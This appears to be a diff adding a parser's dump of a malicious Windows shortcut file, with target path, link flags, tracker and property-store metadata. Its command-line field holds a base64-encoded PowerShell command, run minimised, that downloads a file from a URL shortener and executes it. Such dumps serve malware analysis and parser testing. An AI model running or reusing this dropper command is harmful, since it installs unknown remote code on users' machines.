@@ -1,0 +1,139 @@
+Windows Shortcut Information:
+   Guid: 00021401-0000-0000-C000-000000000046
+   Link flags: HasTargetIDList | HasLinkInfo | HasRelativePath | HasWorkingDir | HasArguments | IsUnicode | EnableTargetMetadata - (524475)
+   File flags: FILE_ATTRIBUTE_ARCHIVE - (32)
+   Creation time: 2024-02-16 21:44:00.915218+00:00
+   Accessed time: 2024-10-03 09:53:00.814244+00:00
+   Modified time: 2024-02-16 21:44:00.915218+00:00
+   File size: 450560
+   Icon index: 0
+   Windowstyle: SW_SHOWMINNOACTIVE
+   Hotkey: UNSET - UNSET {0x0000}
+
+   TARGET:
+      Items:
+      -  Root Folder:
+            Sort index: My Computer
+            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
+      -  Volume Item:
+            Flags: '0xf'
+            Data: null
+      -  File entry:
+            Flags: Is directory
+            File size: 0
+            File attribute flags: 16
+            Primary name: Windows
+      -  File entry:
+            Flags: Is directory
+            File size: 0
+            File attribute flags: 16
+            Primary name: System32
+      -  File entry:
+            Flags: Is directory
+            File size: 0
+            File attribute flags: 16
+            Primary name: WindowsPowerShell
+      -  File entry:
+            Flags: Is directory
+            File size: 0
+            File attribute flags: 16
+            Primary name: v1.0
+      -  File entry:
+            Flags: Is file
+            File size: 450560
+            File attribute flags: 32
+            Primary name: powershell.exe
+
+   LINK INFO:
+      Link info flags: 1
+      Local base path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      Common path suffix: ''
+      Location info:
+         Drive type: DRIVE_FIXED
+         Drive serial number: '0x7cea241e'
+         Volume label: ''
+      Location: Local
+
+   DATA:
+      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      Working directory: C:\Windows\system32
+      Command line arguments: -e aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=
+
+   EXTRA:
+      SPECIAL FOLDER LOCATION BLOCK:
+         Size: 16
+         Special folder id: 37
+         Offset: 221
+      KNOWN FOLDER LOCATION BLOCK:
+         Size: 28
+         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
+         Offset: 221
+      DISTRIBUTED LINK TRACKER BLOCK:
+         Size: 96
+         Length: 88
+         Version: 0
+         Machine identifier: windows11
+         Droid volume identifier: 6F2A005C-0139-4183-8271-EFCFD922DD1A
+         Droid file identifier: CA273BFC-812C-11EF-A074-085BD6C87787
+         Birth droid volume identifier: 6F2A005C-0139-4183-8271-EFCFD922DD1A
+         Birth droid file identifier: CA273BFC-812C-11EF-A074-085BD6C87787
+      METADATA PROPERTIES BLOCK:
+         Size: 561
+         Property store:
+         -  Storage size: 89
+            Version: '0x53505331'
+            Format id: DABD30ED-0043-4789-A7F8-D013A4736622
+            Serialized property values:
+            -  Value size: 61
+               Id: 100
+               Value: System32 (C:\Windows)
+               Value type: VT_LPWSTR
+         -  Storage size: 137
+            Version: '0x53505331'
+            Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
+            Serialized property values:
+            -  Value size: 109
+               Id: 4
+               Value: S-1-5-21-940291183-874774319-2012240919-1001
+               Value type: VT_LPWSTR
+         -  Storage size: 165
+            Version: '0x53505331'
+            Format id: B725F130-47EF-101A-A5F1-02608C9EEBAC
+            Serialized property values:
+            -  Value size: 33
+               Id: 10
+               Value: cmd.exe
+               Value type: VT_LPWSTR
+            -  Value size: 21
+               Id: 15
+               Value: null
+               Value type: VT_FILETIME
+            -  Value size: 21
+               Id: 12
+               Value: null
+               Value type: VT_UI8
+            -  Value size: 41
+               Id: 4
+               Value: Application
+               Value type: VT_LPWSTR
+            -  Value size: 21
+               Id: 14
+               Value: null
+               Value type: VT_FILETIME
+         -  Storage size: 101
+            Version: '0x53505331'
+            Format id: 28636AA6-953D-11D2-B5D6-00C04FD918D0
+            Serialized property values:
+            -  Value size: 73
+               Id: 30
+               Value: C:\Windows\System32\cmd.exe
+               Value type: VT_LPWSTR
+         -  Storage size: 57
+            Version: '0x53505331'
+            Format id: 446D16B1-8DAD-4870-A748-402EA43D788C
+            Serialized property values:
+            -  Value size: 29
+               Id: 104
+               Value: null
+               Value type: VT_CLSID
+
